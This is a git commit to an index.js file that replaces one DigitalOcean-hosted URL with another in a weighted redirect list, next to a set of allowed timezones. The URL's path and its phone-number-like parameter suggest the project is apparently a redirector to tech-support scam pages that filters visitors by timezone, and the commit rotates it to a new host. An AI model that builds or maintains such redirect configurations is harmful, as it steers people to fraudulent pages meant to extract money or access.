b882b919975411655f320714a07211f9db6625de
paalakash <palaksh452@gmail.com>
2026-06-20 09:21:18 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://walrus-app-d3lt9.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-844-950-5533", weight: 1.0 }
+    { url: "https://lobster-app-e4s5r.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-844-950-5533", weight: 1.0 }
 
 ];
 
